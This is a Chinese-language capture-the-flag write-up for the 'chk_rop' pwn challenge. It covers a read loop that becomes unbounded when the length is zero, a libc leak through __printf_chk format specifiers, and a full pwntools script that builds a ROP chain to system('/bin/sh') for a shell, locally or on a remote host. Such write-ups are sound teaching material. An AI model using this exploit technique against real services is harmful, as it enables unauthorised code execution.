
## chk_rop
### 程序分析

```c
v0 = strlen(s);
v5 = 3 * v0 - 48 * ((unsigned __int64)(0xAAAAAAAAAAAAAAABLL * (unsigned
__int128)(3 * v0) >> 64) >> 5);
write(1, "And the content:\n", 0x11uLL);
return sub_4008F8((unsigned __int8 *)&v2, v5);
```
这里的`v5`实际就是 `v5 = 3*v0 % 0x30;`

读入字符串函数存在漏洞

```c
signed __int64 __fastcall sub_4008F8(unsigned __int8 *a1, int a2){
    signed __int64 result; // rax
    unsigned __int8 *buf; // [rsp+18h] [rbp-8h]
    buf = a1;
    do{
        if ( (signed int)read(0, buf, 1uLL) <= 0 )
        exit(1);
        result = *buf;
        if ( (_BYTE)result == 10 )
        break;
        ++buf;
        result = (signed __int64)&a1[a2];
    }
    while ( (unsigned __int8 *)result != buf );
    return result;
}
```
由于do while的特殊性,do优先一次执行。当`a2=0`时,while条件永远成立,也即可以读任意长度
的字符串。缓冲区溢出!

### 解题思路
这里由于并没有给libc相关地址,所以可以先泄漏libc,再执行system("/bin/sh\x00");

但是其实这里有一个更简单的方式,main函数里的代码

```c
puts("Give you a gift...");
read(0, &buf, 8uLL);
__printf_chk(1LL, &buf);
```

虽然`__printf_chk`函数我们没法用`$`什么的做到任意写、读。但是可以利用`%a`的特殊性(以`double`类型)输出栈上的内容,可以泄漏libc信息。

### exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './chk_rop'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../../libc-2.23.so'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x00000000004009d3 # pop rdi ; ret

# leak libc
ru('Give you a gift...\n')
sl('%p'*3)

data = ru('Tell me U filename\n')
if is_remote:
    libc_base = eval('0x'+data.split('0x')[2]) - 1012320
if is_local:
    libc_base = eval('0x'+data.split('0x')[2]) - 1101697
info_addr('libc_base',libc_base)

# debug('b *0x4008f0')

# bypass chk 
se('a'*16)

# rop
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search("/bin/sh").next()
payload = 'a'*88
if is_local:
    payload += p64(0x04008F7) + p64(prdi) + p64(binsh) + p64(system)
if is_remote:
    payload += p64(prdi) + p64(binsh) + p64(system)

ru('And the content:\n')
sl(payload)

p.interactive()

```

如此,exp